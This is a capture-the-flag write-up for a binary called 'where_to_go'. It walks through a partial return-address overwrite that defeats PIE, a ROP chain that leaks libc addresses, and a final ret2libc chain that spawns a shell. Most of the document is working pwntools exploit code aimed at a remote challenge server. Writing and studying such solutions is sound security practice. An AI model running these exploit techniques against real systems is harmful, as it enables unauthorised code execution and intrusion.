# where_to_go

###### This is a buffer overflow challenge, but with aslr and pie enabled.
If we inspect the binary, we find a function, which is never called. It seems, that the function outputs the main
address with ```write()```, so we could defeat pie with that. The problem is, that we don't know the address. But we
could do a **partial overwrite**. We will overwrite the return address like this ```0xXXXXXXXXYZZZ```. So the X's are
the bytes we already have, and which aren't affected by our partial overwrite. The Z's are the fuction offset which we
know. The only byte we have to bruteforce is Y. So our chance to hit the address is ```1/16```. So here is the exploit:
```python
from pwn import *

while True:
    #p = process("./where_to_go")
    p = remote("35.223.244.247", 49155)
    p.recvline()
    p.send("A"*40 + "\x99\x28")
    try:
        leak = p.recv().split()
        break
    except:
        p.close()

print(leak)
p.interactive()
```

So if we run this, we should call the leak function within seconds and get the leak. From now on it's like a normal
ret2libc buffer overflow, but we need to defeat aslr first. Sadly, we don't have the libc. So we have to leak two addresses, to get the libc with libc database. So we've to create ropchain like this:
```offset + pop_rdi + 1 + pop_rsi + read_got + write + pop_rdi + 1 + pop_rsi + write_got + write + main```
* the ```1``` is the fd for stdout
* sadly we can't control ```rdx``` (which the lengh is stored in), so we hope a value greater than 6 is in ```rdx```, so that we can print an address. So the script now looks like this:
```python
from pwn import *

while True:
    #p = process("./where_to_go",env={"LD_PRELOAD" : "./libc.so.6"})
    p = remote("35.223.244.247", 49155)
    p.recvline()
    p.send("A"*40 + "\x99\x28")
    try:
        leak = p.recv().split()
        break
    except:
        p.close()

main = u64(leak[0][:6].ljust(8, "\x00"))
base = main - 0x7da
write = base + 0x680
write_got = base + 0x200fb8
read_got = base + 0x200fc8
pop_rdi = base + 0x943
pop_rsi_r15 = base + 0x941
ret = base + 0x898

p.sendline("A"*40 + p64(ret) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(write) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write) + p64(main))

leak = p.recv().split("\n")
print(leak)
p.interactive()
```
So this works! We got the leaks! We can get the libc from libc database easily. Now we can calculate the offsets and
get a shell! Now that aslr and pie is defeated, we can create our final ropchain:
```offset + pop_rdi + binsh + system```
Now, our final exploit:
```python
from pwn import *

while True:
    #p = process("./where_to_go",env={"LD_PRELOAD" : "./libc.so.6"})
    p = remote("35.223.244.247", 49155)
    p.recvline()
    p.send("A"*40 + "\x99\x28")
    try:
        leak = p.recv().split()
        break
    except:
        p.close()

main = u64(leak[0][:6].ljust(8, "\x00"))
base = main - 0x7da
write = base + 0x680
write_got = base + 0x200fb8
pop_rdi = base + 0x943
pop_rsi_r15 = base + 0x941
ret = base + 0x898

p.sendline("A"*40 + p64(ret) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write) + p64(main))

sleep(1)
leak = p.recv().split("\x00")
write_leak = u64(leak[0][7:].ljust(8, "\x00"))
libc_base = write_leak - 0x110210
system = libc_base + 0x4f550
binsh = libc_base + 0x1b3e1a

p.sendline("A"*40 + p64(pop_rdi) + p64(binsh) + p64(system))
p.interactive()
```
Cool, it works and we got a shell!